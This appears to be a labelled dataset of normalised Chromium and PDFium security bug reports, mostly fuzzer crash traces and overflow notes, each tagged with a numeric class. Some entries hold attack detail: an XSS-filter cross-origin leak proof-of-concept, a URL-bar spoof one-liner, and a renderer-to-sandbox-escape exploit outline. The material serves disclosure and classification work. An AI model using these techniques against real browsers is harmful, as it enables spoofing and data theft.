allocator char int pp_decryptorstreamtype ppapi proxy pppdecryptor_buffer std 1 basic_string char std 1 char_traits char std 1 allocator char base/tuple.h:570:0 21 in dispatch ppapi proxy ppp_contentdecryptor_private_proxy ppapi proxy ppp_contentdecryptor_private_proxy void void ppapi proxy ppp_contentdecryptor_private_proxy int pp_decryptorstreamtype const ppapi proxy pppdecryptor_buffer const std 1 basic_string char std 1 char_traits char std 1 allocator char ppapi/proxy/ppapi_messages.h:798:0 22 in ppapi proxy ppp_contentdecryptor_private_proxy onmessagereceived ipc message const ppapi/proxy/ppp_content_decryptor_private_proxy.cc:448:0 23 in ppapi proxy dispatcher onmessagereceived ipc message const ppapi/proxy/dispatcher.cc:69:0 24 in ppapi proxy plugindispatcher onmessagereceived ipc message const ppapi/proxy/plugin_dispatcher.cc:238:0 25 in ipc channelproxy context ondispatchmessage ipc message const ipc/ipc_channel_proxy.cc:273:0 26 in run base/bind_internal.h:190:0 27 in makeitso base/bind_internal.h:898:0 28 in base internal invoker 2 base internal bindstate base internal runnableadapter void ipc channelproxy context ipc message const void ipc channelproxy context ipc message const void ipc channelproxy context ipc message void ipc channelproxy context ipc message const run base internal bindstatebase base/bind_internal.h:1248:0 29 in run base/callback.h:401:0 30 in base messageloop runtask base pendingtask const base/message_loop/message_loop.cc:458:0 31 in deferorrunpendingtask base/message_loop/message_loop.cc:470:0 32 in base messageloop dowork base/message_loop/message_loop.cc:584:0 33 in base messagepumpdefault run base messagepump delegate base/message_loop/message_pump_default.cc:32:0 uninitialized value was created by an allocation of decrypted_frame_info in the stack frame of function media cdmadapter deliverframe int cdm status const linked_ptr media videoframeimpl const pp_decrypttrackinginfo const 0 in media cdmadapter deliverframe int cdm status const linked_ptr media videoframeimpl const pp_decrypttrackinginfo const media/cdm/ppapi/cdm_adapter.cc:895:0 summary memorysanitizer use-of-uninitialized-value 0	11
security uninitialized value possible in cjs_publicmethods makeformatdate same issue as in but in another function in the same file use of string.getat i+1 without bounds checking in cjs_publicmethods makeformatdate starting at publicmethods.cpp:928	11
security integer overflow in fpdfsdk/include/fsdk_mgr.h cgw_arraytemplate has a quicksort member function that contains its own quick sort implementation unfortunately it includes a common integer overflow bug fx_uint m nstartpos nstoppos 2 because nstartpos and nstoppos here are 32-bit numbers this calculation could potentially overflow and wrap especially on a 64-bit system instead the median should be calculated as fx_uint m nstartpos nstoppos nstartpos 2 or even better pdfium should make use of the standard library s implementation of quick sort	11
heap-buffer-overflow in void skmatrixconvolutionimagefilter filterpixels uncheckedpixelfetcher true detailed report fuzzer sugoi_filter_fuzzer job type linux_asan_filter_fuzz_stub crash type heap-buffer-overflow read 4 crash address crash state crash stack void skmatrixconvolutionimagefilter filterpixels uncheckedpixelfetcher true skmatrixconvolutionimagefilter onfilterimage skimagefilter filterimage minimized testcase 0.51 kb	11
use-of-uninitialized-value in webcore transformationmatrix blend detailed report fuzzer inferno_twister job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state crash stack webcore transformationmatrix blend webcore matrix3dtransformoperation blend webcore transformoperations blendbymatchingoperations minimized testcase 4.19 kb filer inferno chromium.org	11
heap-use-after-free in webcore htmlimportloader removeimport detailed report fuzzer inferno_twister job type linux_asan_content_shell_drt crash type heap-use-after-free read 8 crash address crash state crash stack webcore htmlimportloader removeimport webcore htmlimportchild importdestroyed free stack webcore htmlimportscontroller htmlimportscontroller webcore supplementablebase webcore document false providesupplement unminimized testcase additional requirements requires http filer inferno chromium.org	11
integer overflow from offset size in extension.h and fpdfview.cpp there are still some offset size which may cause integer overflow in extension.h and fpdfview.cpp they have n't been covered in bug 382667	11
heap-use-after-free in webcore element attrifexists detailed report fuzzer inferno_twister job type windows_syzyasan_chrome crash type use-after-free read 4 crash address crash state crash stack webcore findattrnodeinlist webcore element normalizeattributes free stack webcore elementdata destroy webcore attr elementattribute unminimized testcase additional requirements requires http filer inferno chromium.org	11
integer overflow in fx_allocstringw this is a straightforward overflow 8 static cfx_stringdataw fx_allocstringw int nlen 9 10 if nlen 0 11 return null 12 13 cfx_stringdataw pdata cfx_stringdataw fx_alloc fx_byte sizeof long 3 nlen 1 sizeof fx_wchar the callers of this static function do not sufficiently check nlen some callers do not check it at all	11
bad-cast to webcore shadowroot from webcore text shadowroot.h:164:1 detailed report fuzzer inferno_twister job type linux_asan_chrome_media crash type unknown crash address crash state crash stack webcore textiterator advance webcore textiterator textiterator webcore documentmarkercontroller removemarkers minimized testcase 1.57 kb	11
untrustworthy navigation causes http basic auth dialog origin confusion/spoofing demo we show tab-modal password prompts before updating the address bar and visually associate them with the previously loaded document whenever somebody navigates a trustworthy window to a malicious location this seems rather undesirable possible fix update the address bar and hide the original document before showing the prompt	11
heap-buffer-overflow in convolvevertically_sse2 detailed report fuzzer bj_broddelwerk job type linux_asan_chrome_v8_arm crash type heap-buffer-overflow write 4 crash address crash state crash stack convolvevertically_sse2 bgraconvolve2d skbitmapscaler resize minimized testcase 0.23 kb filer inferno chromium.org	11
use-of-uninitialized-value in webrtc buildmediadescription detailed report fuzzer phoglund_webrtc_peerconnection job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state crash stack webrtc buildmediadescription webrtc sdpserialize webrtc jsepsessiondescription tostring minimized testcase 5.65 kb additional requirements requires http filer inferno chromium.org	11
attempting free in cjbig2_context cjbig2_context vulnerability details invalid free in pdfium when loading a pdf file version chrome version version 37.0.2030.0 274749 operating system linux ubuntu 12.04 reproduction case 1 build with asan 2 run out/release/chrome user-data-dir=zzz 1253.pdf for crashes please include the following additional information 10==error addresssanitizer attempting free on address which was not malloc ed in thread t0 chrome 0 in operator delete void asan_rtl 1 in cjbig2_context cjbig2_context third_party/pdfium/core/src/fxcodec/jbig2/jbig2_context.cpp:62 2 in cjbig2_context destroycontext cjbig2_context third_party/pdfium/core/src/fxcodec/jbig2/jbig2_context.cpp:22 3 in ccodec_jbig2module destroyjbig2context void third_party/pdfium/core/src/fxcodec/codec/fx_codec_jbig.cpp:23 4 in cpdf_dibsource continueloaddibsource ifx_pause third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:444 is located 8035936 bytes inside of 33554432-byte region allocated by thread t0 chrome here 0 in malloc asan_rtl 1 in fxmem_creatememorymgr third_party/pdfium/core/src/fxcrt/fx_basic_memmgr_mini.cpp:77 2 in fpdf_initlibrary third_party/pdfium/fpdfsdk/src/fpdfview.cpp:165 3 in chrome_pdf initializesdk void pdf/pdfium/pdfium_engine.cc:483 4 in chrome_pdf pdfmodule createinstance int pdf/pdf.cc:95 5 in pp instance_didcreate int unsigned int char const char const ppapi/cpp/module.cc:70 6 in ppapi ppp_instance_combined didcreate int unsigned int char const char const ppapi/shared_impl/proxy_lock.h:147	11
use-of-uninitialized-value in webcore audiocontext schedulenodedeletion detailed report fuzzer mbarbella_js_mutation_layout job type linux_msan_chrome crash type use-of-uninitialized-value crash address crash state crash stack webcore audiocontext schedulenodedeletion webcore audiocontext handlepostrendertasks webcore audiodestinationnode render minimized testcase 2.54 kb filer inferno chromium.org	11
security integer overflow in javascript/document.cpp filed on behalf of mdemspky wchar_t presult wchar_t malloc ilenth+1 sizeof wchar_t memset presult 0 ilenth+1 there is no overflow check and this code only zeroes 1/4th of the memory also ilenth is misspelled should be ilength that pattern occurs multiple times in the file it is straightforward and safe to use calloc instead of malloc here	11
heap-use-after-free in extensions v8schemaregistry getschema detailed report fuzzer meacer_chromebot_extensions job type linux_asan_chrome_mp crash type heap-use-after-free read 8 crash address crash state crash stack extensions v8schemaregistry getschema extensions schemaregistrynativehandler getschema free stack extensions dispatcher onrenderprocessshutdown content renderthreadimpl shutdown additional requirements requires interaction gestures	11
heap-use-after-free in webcore rendertreebuilder createrendererforelementifneeded detailed report fuzzer inferno_twister job type linux_asan_content_shell_drt crash type heap-use-after-free read 8 crash address crash state crash stack webcore rendertreebuilder createrendererforelementifneeded webcore element attach free stack webcore renderobjectchildlist destroyleftoverchildren webcore renderblock willbedestroyed regressed minimized testcase 2.31 kb	11
bad-cast to gfx multianimation from gfx throbanimation tab.cc:1096:11 detailed report fuzzer meacer_extension_apis job type linux_ubsan_vptr_chrome crash type bad-cast crash address crash state crash stack bad-cast to gfx multianimation from gfx throbanimation tab.cc:1096:11 additional requirements requires interaction gestures	11
bad-cast to webcore htmllabelelement from webcore svgunknownelement webnode.h:164:16 detailed report fuzzer bj_broddelwerk job type linux_asan_chrome_experimental crash type bad-cast crash address crash state crash stack bad-cast to webcore htmllabelelement from webcore svgunknownelement webnode.h:164:16 minimized testcase 4.55 kb	11
security possible integer overflow in cfx_basicarray append 80 fx_bool cfx_basicarray append const cfx_basicarray src 81 82 int noldsize m_nsize 83 if setsize m_nsize src.m_nsize 1 84 return false 85 86 fxsys_memcpy32 m_pdata noldsize m_nunitsize src.m_pdata src.m_nsize m_nunitsize 87 return true 88 m_nsize src.m_nsize could overflow in a way that causes the memory allocation to succeed but to allocate a too-small region then line 86 assumes that there is enough memory but if there is n't there is a potential for heap buffer overflow additionally the arithmetic on line 86 could also overflow in general i tend to think cfx_basicarray should be replaced with the safer and performant std vector doing so would also reduce the total size of the code which is always nice	11
heap-use-after-free in blink renderbox pixelsnappedclientheight detailed report fuzzer miaubiz_svg_fuzzer job type windows_asan_chrome crash type heap-use-after-free read 4 crash address crash state crash stack blink renderbox pixelsnappedclientheight blink renderbox canbescrolledandhasscrollablearea free stack blink rendertextcontrolsingleline scalar blink renderobject postdestroy minimized testcase 2.48 kb additional requirements requires gestures filer inferno	11
chrome exploit v8 properties p2phostmsg_send see writeup.pdf 1 v8 slow fast properties confusion code in src/objects.cc:4089 maybehandle object jsobject setownpropertyignoreattributes object lookupown name lookup true if is_observed lookup.isproperty if lookup.isdataproperty old_value object getpropertyorelement object name tohandlechecked old_attributes lookup.getattributes switch lookup.type case normal replaceslowproperty object name value attributes getpropertyorelement can invoke a getter the getter can transform object to fast properties confusing replaceslowproperty into corrupting memory the lookup.isdataproperty actually checks whether name is a getter and it takes some trickery to get past that see writeup.pdf this bug was fixed by refactoring on august 18 but still impacts current stable and beta i got the renderer arbitrary r/w to work on android and 64-bit linux i think it should work on windows as well 2 p2phostmsg_send oob write content/browser/renderer_host/p2p/socket_dispatcher_host.cc:269 void p2psocketdispatcherhost onsend int socket_id const rtc packetoptions options content/browser/renderer_host/p2p/socket_host.cc:131 void updatertpauthtag char rtp int len const rtc packetoptions options size_t tag_length options.packet_time_params.srtp_auth_tag_len char auth_tag rtp len tag_length if hmac.digestlength tag_length notreached return memcpy auth_tag options.packet_time_params.srtp_packet_index 4 memcpy auth_tag output tag_length the srtp_auth_tag_len field is renderer-controlled and lacks validation the first memcpy oob writes 4 bytes if srtp_auth_tag_len 0 socket_host.cc also has a bunch of other issues see writeup.pdf chrome version 37.0.2062.120 stable 38.0.2125.66 beta operating system renderer r/w all sandbox break 64-bit linux reproduction run webserver inside v8p2p navigate to etc/passwd is displayed	9
security crash in memcpy in chrome_pdf copyimage vulnerability details the following testcase with the attached example.pdf crashes chrome on windows and linux the latest asan build and the current release version are affected the example.pdf file is not corrupted as far as i am aware version chrome version all current versions operating system linux and windows reproduction case script function start ifr=document.createelement iframe try ifr.setattribute src example.pdf catch e try document.body.appendchild ifr catch e try ifr.width='55 catch e try ifr.height='47 catch e script body onload start body for crashes please include the following additional information type of crash tab crash state asan output attached in debug.txt the top frame seems to be bogus	9
heap-use-after-free in blink event path vulnerability details the attached testcase crashes the latest asan build of chrome version chrome version asan-symbolized-linux-release-287271 operating system linux reproduction case attached for crashes please include the following additional information type of crash tab crash state asan output in debug.txt	11
heap-use-after-free in blink renderlayerscrollablearea updatecompositinglayersafterscroll vulnerability details the attached testcase crashes stable chrome on windows and the latest asan build the freed object does n't seem to be protected by partition alloc version chrome version stable and dev operating system linux and windows reproduction case attached in crash.zip as it requires multiple files to repro for crashes please include the following additional information type of crash tab crash state asan output attached in debug.txt	11
heap-use-after-free in blink document didremoveallpendingstylesheet vulnerability details testcase attached in crash.zip as it requires multiple files crashes the latest asan build pretty reliable for me however might need a few reloads version chrome version asan-symbolized-linux-release-289059 operating system linux reproduction case attached for crashes please include the following additional information type of crash tab crash state asan output in debug.txt	11
bad-cast to sessionservice from invalid vptr bind_internal.h:248:12 detailed report fuzzer miaubiz_css_fuzzer job type linux_ubsan_vptr_chrome crash type bad-cast crash address crash state crash stack bad-cast to sessionservice from invalid vptr bind_internal.h:248:12 unminimized testcase additional requirements requires gestures filer inferno	11
security uaf with blob creation and shared workers vulnerability details an uaf or a segv happens when a new window is opened and closed automatically from an onmessage event triggered by a shared worker with a blob creation loop version chrome version 36.0.1985.125 stable up to tot 287661 asan operating system ubuntu x64 windows x86 reproduction case 1 launch the added repro file 2 click start link for crashes please include the following additional information type of crash tab crash state see added stack trace 287661	11
v8 runtime_arrayconcat uninitialized memory leak useragent mozilla/5.0 x11 linux x86_64 applewebkit/537.36 khtml like gecko chrome/36.0.1985.125 safari/537.36 steps to reproduce the problem runtime_arrayconcat fast double case allocates an uninitialized array handle fixedarraybase storage isolate factory newfixeddoublearray estimate_result_length if concat later encounters a hole it bails out leaving the rest of the array uninitialized if elements is_the_hole i failure true break attacker can read out this memory repro is attached you might have to hit f5 a few times to see anything interesting tested on 36.0.1985.125 and 38.0.2120.0 proposed patch is attached what is the expected behavior what went wrong did this work before n/a chrome version 36.0.1985.125 channel stable os version flash version shockwave flash 14.0 r0	11
security windows sandbox anonymous kernel object unrestricted dacl vulnerability details the windows sandbox relies heavily on duplicating various handles into the sandboxed processes from the broker to provide for things like ipc probably the most used is the sharedmemory class which wraps sharing of section objects up in a relatively platform independent manner on windows the sharedmemory class uses anonymous section objects i.e backed by swap and not named in the object namespace this has the effect of assigning a default null dacl to the kernel object associated with this section you can confirm this by looking up the section handle in something like process explorer or process hacker and checking its dacl this has an interesting consequence when used to duplicate sections between processes namely that the null dacl means there are effectively no permissions associated with the object this includes bypassing integrity level checks so a sandboxed process can use duplicatehandle to increase the access mask of a section handle in their process this might be most important if the broker code calls sharedmemory sharereadonlytoprocess or similar assuming that it means the sandbox process can not tamper with it and only read it the only place i ve seen this being used and not sure its for security necessarily is the sharing of user/greasemonkey scripts you might be able to cause issues with other renderer processes this way by changing the section to r/w and corrupting the data you might also be able to resize the section to cause issues such as reducing it and then placing memory at that address note that this affects any sandboxed process including renderers it probably will only work if the object was opened with write permissions first then mapped read only in the sandbox also note that it should affect any anonymous kernel object such as events and semaphores but they are probably uninteresting version chrome version 34.0.1806.0 247121 operating system windows 7 sp1 x64 reproduction case just call duplicatehandle in process on an anonymous section handle of your choosing you should be able to increase permissions to include section_all_access	2
security xss filter information leak vulnerability details by abusing chrome s xss filter attackers can gain information on a web page of a different origin even the target page does not have any xss vulnerabilities suppose that victim web site has a web page contains a script shown below script var secret='1234 script let s suppose that an user accesses below urls url-1 script var secret='1233 url-2 script var secret='1234 when the user accesses url-1 xss filter will not be triggered because the script in the response is not contained within the request on the other hand url-2 triggers the filter this means that an attacker can gain information on the secret value in the script if he can know whether individual request triggered the filter or not it is easy for the attacker to verify whether the filter reacted or not at least if the victim web page uses x-xss-protection 1 mode=block in the block mode the filter changes the web page s url to data if it detects attacks the attacker can abuse this first the attacker makes a page on his web site then he creates an iframe pointing to url-1 in the attacker s page when the iframe s onload event fires the javascript code in the attacker s page changes the iframe s src to data as for url-1 this fires second onload event of the iframe regarding url-2 immediately after or during the url-2 s load the filter changes the url to data so when the attacker s js changes the iframe s src to data another onload event does not happen thus the attacker can verify whether the filter reacted or not by checking whether the iframe s second onload event fires or not it means that he can gain some information contained in the target page s script tag some additional notes are listed above this attack is not practical if the value that the attacker is trying to steal or other part in the same script tag has much entropy this is because as far as i know we do not have an efficient method that is applicable to this attack such as binary search used in blind sql injection the only possible idea i came up with is using urls with multiple payloads like the following one script var secret='1230 var secret='1231 var secret='1232 var secret='1233 this can surely reduce the number of http requests necessary to reach the answer but the effect is limited in case the target s entropy is really huge the attacker can not obtain information on the specific bytes contained in the target value 0 this restriction comes from how the filter matches scripts in the response against request the filter seems to ignore these bytes in the response-request matching process i am not sure if there is a way to steal information without mode=block if the target page has a certain structure that is convenient for attackers there would be a way also i am not sure if this attack really needs to use iframe for now version chrome version 36.0.1985.125 m production release operating system windows 7 sp1 reproduction case i made a poc code victim s side php header x-xss-protection 1 mode=block html body script var secret='1234 script body html attacker s side body h1 push the button to start the attack h1 script var iframemaxnum 100 start 1000 end 2000 var dat queue iframecntainer result function startattack iframecontainer document.getelementbyid iframecontainer result document.getelementbyid result for var i start i end i queue.push i processqueue function processqueue result.textcontent queue.length in queue var iframenum iframecontainer.getelementsbytagname iframe length if iframenum iframemaxnum for var i 0 i iframemaxnum iframenum i var j queue.shift if j undefined break step1 j if queue.length 0 settimeout processqueue 10 return else for var i 0 i 10 i settimeout writeresult i 1000 function step1 i var ifrm document.createelement iframe iframecontainer.appendchild ifrm ifrm.id ifrm i ifrm.onload onloadstep2 ifrm.style.width 1px ifrm.style.height 1px ifrm.src script var secret i dat i 1 function onloadstep2 var ifrm this var i ifrm.id.split 1 ifrm.onload onloadstep3 ifrm.src data dat i 2 function onloadstep3 var ifrm this var i ifrm.id.split 1 dat i 3 ifrm.parentnode.removechild ifrm function writeresult var s for var i in dat if dat i 2 s i br result.innerhtml s script input type button value attack onclick startattack div id iframecontainer div div id result div body	9
heap-buffer-overflow in chrome_pdf pdfiumengine getpagerect detailed report fuzzer attekett_surku_fuzzer job type linux_asan_chrome_v8_arm crash type heap-buffer-overflow read 4 crash address crash state chrome_pdf pdfiumengine getpagerect chrome_pdf instance handleinputevent pp inputevent_handleevent regressed minimized testcase 869.09 kb additional requirements requires gestures filer inferno	11
assertion failed actualinfo derefobjectfunction wrappertypeinfo.derefobjectfunction unknown in blink v8event createwrapper detailed report fuzzer therealholden_worker job type linux_asan_chrome_mp crash type unknown crash address crash state crash stack blink v8event createwrapper blink wrap blink v8workerglobalscopeeventlistener handleevent unminimized testcase filer inferno chromium.org	11
draw the image outside of the inline frame steps to reproduce the problem 1 open the attached html file repro1.html what is the expected behavior what went wrong did this work before n/a chrome version 37.0.2062.94 channel beta os version 4.4.2 flash version this seems to be the same issue discussed here issue 331168	11
eavesdrop on the user speech abusing the old speech api useragent mozilla/5.0 macintosh intel mac os x 10_9_2 applewebkit/537.36 khtml like gecko chrome/33.0.1750.152 safari/537.36 steps to reproduce the problem info is here poc what is the expected behavior what went wrong the old speech api x-webkit-speech has some flaws which enable it to be obfuscated more info here did this work before no chrome version 33.0.1750.152 channel stable os version os x 10.9.2 flash version shockwave flash 12.0 r0	2
security you can spoof any domain in the url bar useragent mozilla/5.0 windows nt 6.3 wow64 applewebkit/537.36 khtml like gecko chrome/35.0.1916.153 safari/537.36 steps to reproduce the problem run this on any page history.replacestate null null blob location.protocol www.google.com array join location.host what is the expected behavior the username part of the url should be collapsed from view in the url bar as is normally done for example history.replacestate null null location.protocol www.google.com location.host is handled properly what went wrong the username part of the url is not collapsed from view in the url bar did this work before no chrome version 35.0.1916.153 channel stable os version 6.3 flash version shockwave flash 14.0 r0 in order to spoof an https url e.g this exploit needs to be run on a page that is already being served as https	9
heap-use-after-free in cpdf_object release tested on os ubuntu 12.04 pdfium_test the one from asan chrome 39.0.2133.0 developer build 291444 the repro-file causes clean crash in the pdfium_test but if you open the repro-file in chrome chrome fails to render the file but no crash occurs i would guess you guys still want to check if the issue is reachable in chrome asan-trace 16065==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 4 at thread t0 0 in cpdf_object release b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_objects.cpp:10 1 in cpdf_parser closeparser int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:105 2 in cpdf_parser startparse ifx_fileread int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:148 3 in cpdf_parser startasynparse ifx_fileread int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:1531 4 in fpdfavail_getdocument b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/fpdfsdk/src/fpdf_dataavail.cpp:128 5 in renderpdf char const char const unsigned long outputformat b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/samples/pdfium_test.cc:282 6 in main b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/samples/pdfium_test.cc:393 7 in 0 8 in start 0 is located 4 bytes inside of 48-byte region freed by thread t0 here 0 in free 0 1 in cpdf_parser islinearizedfile ifx_fileread unsigned int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:1499 2 in cpdf_parser startasynparse ifx_fileread int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:1529 3 in fpdfavail_getdocument b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/fpdfsdk/src/fpdf_dataavail.cpp:128 4 in renderpdf char const char const unsigned long outputformat b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/samples/pdfium_test.cc:282 5 in main b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/samples/pdfium_test.cc:393 6 in 0 previously allocated by thread t0 here 0 in malloc 0 1 in cpdf_dictionary create b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser include/fpdfapi/fpdf_objects.h:428 2 in cpdf_syntaxparser getobject cpdf_indirectobjects unsigned int unsigned int int parse_context int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:2141 3 in cpdf_parser islinearizedfile ifx_fileread unsigned int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:1491 4 in cpdf_parser startasynparse ifx_fileread int int b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_parser/fpdf_parser_parser.cpp:1529 5 in fpdfavail_getdocument b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/fpdfsdk/src/fpdf_dataavail.cpp:128 6 in renderpdf char const char const unsigned long outputformat b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/samples/pdfium_test.cc:282 7 in main b/build/slave/asan_release__symbolized_/build/src/out/release third_party/pdfium/samples/pdfium_test.cc:393 8 in 0	7
negative-size-param in opj_t2_decode_packets vulnerability details the following testcase crashes the 32 bit asan build of pdfium_test 64 bit is n't affected the vulnerable code in t2.c check if the cblk data have allocated enough memory if l_cblk data_current_size l_seg newlen l_cblk data_max_size opj_byte new_cblk_data opj_byte opj_realloc l_cblk data l_cblk data_current_size l_seg newlen if new_cblk_data opj_free l_cblk data l_cblk data_max_size 0 opj_event_msg p_manager evt_error not enough memory to realloc code block cata n return opj_false l_cblk data_max_size l_cblk data_current_size l_seg newlen l_cblk data new_cblk_data memcpy l_cblk data l_cblk data_current_size l_current_data l_seg newlen this is likely due to an integer overflow in the check l_cblk data_current_size l_seg newlen for large newlen the code will fail to allocate enough memory in 64-bit build we get the following error read segment too long 1034683436 with max 2723 for codeblock 0 p=0 b=0 r=4 c=0 from the corresponding code here if l_current_data l_seg newlen p_src_data p_max_length fprintf stderr read segment too long d with max d for codeblock d p d b d r d c d n l_seg newlen p_max_length cblkno p_pi precno bandno p_pi resno p_pi compno return opj_false in 32-bit builds this check fails as well asan output asan sigsegv 12896==error addresssanitizer segv on unknown address pc sp bp t0 0 in opj_t2_read_packet_data home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/t2.c:1170:0 1 in opj_t2_decode_packet home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/t2.c:525:0 2 in opj_t2_decode_packets home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/t2.c:399:0 3 in opj_tcd_t2_decode home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/tcd.c:1487:0 4 in opj_tcd_decode_tile home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/tcd.c:1230:0 5 in opj_j2k_decode_tile home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/j2k.c:7661:0 6 in opj_j2k_decode_tiles home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/j2k.c:9177:0 7 in opj_j2k_exec home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/j2k.c:7048:0 8 in opj_j2k_decode home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/j2k.c:9368:0 9 in opj_jp2_decode home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/jp2.c:1332:0 10 in opj_decode home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/fx_libopenjpeg/src libopenjpeg20/openjpeg.c:413:0 11 in cjpx_decoder init unsigned char const int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:624:0 12 in ccodec_jpxmodule createdecoder unsigned char const unsigned int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fxcodec/codec/fx_codec_jpx_opj.cpp:764:0 13 in cpdf_dibsource loadjpxbitmap home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:643:0 14 in cpdf_dibsource createdecoder home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:599:0 15 in cpdf_dibsource startloaddibsource cpdf_document cpdf_stream const int cpdf_dictionary cpdf_dictionary int unsigned int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:335:0 16 in cpdf_imagecache startgetcachedbitmap cpdf_dictionary cpdf_dictionary int unsigned int int cpdf_renderstatus int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_cache.cpp:310:0 17 in cpdf_pagerendercache startgetcachedbitmap cpdf_stream int unsigned int int cpdf_renderstatus int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_cache.cpp:131:0 18 in cpdf_progressiveimageloaderhandle start cpdf_imageloader cpdf_imageobject const cpdf_pagerendercache int unsigned int int cpdf_renderstatus int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:1489:0 19 in cpdf_imageloader startloadimage cpdf_imageobject const cpdf_pagerendercache void int unsigned int int cpdf_renderstatus int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_loadimage.cpp:1549:0 20 in cpdf_imagerenderer startloaddibsource home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_image.cpp:371:0 21 in cpdf_imagerenderer start cpdf_renderstatus cpdf_pageobject const cfx_matrix const int int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render_image.cpp:525:0 22 in cpdf_renderstatus continuesingleobject cpdf_pageobject const cfx_matrix const ifx_pause home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render.cpp:350:0 23 in cpdf_progressiverenderer continue ifx_pause home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render.cpp:1175:0 24 in cpdf_progressiverenderer start cpdf_rendercontext cfx_renderdevice cpdf_renderoptions const ifx_pause int home/bobthebuilder/chromium/src/out/release third_party/pdfium/core/src/fpdfapi/fpdf_render/fpdf_render.cpp:1114:0 25 in fpdf_renderpage_retail crendercontext void int int int int int int int ifsdk_pause_adapter home/bobthebuilder/chromium/src/out/release third_party/pdfium/fpdfsdk/src/fpdfview.cpp:772:0 26 in fpdf_renderpagebitmap home/bobthebuilder/chromium/src/out/release third_party/pdfium/fpdfsdk/src/fpdfview.cpp:574:0 27 in renderpdf char const char const unsigned int outputformat home/bobthebuilder/chromium/src/out/release third_party/pdfium/samples/pdfium_test.cc:324:0 28 in main home/bobthebuilder/chromium/src/out/release third_party/pdfium/samples/pdfium_test.cc:406:0 29 in libc_start_main 30 in start 0:0 addresssanitizer can not provide additional info summary addresssanitizer segv 0 12896==aborting version chrome version trunk 32-bit build reproduction case attached in repro.pdf	7
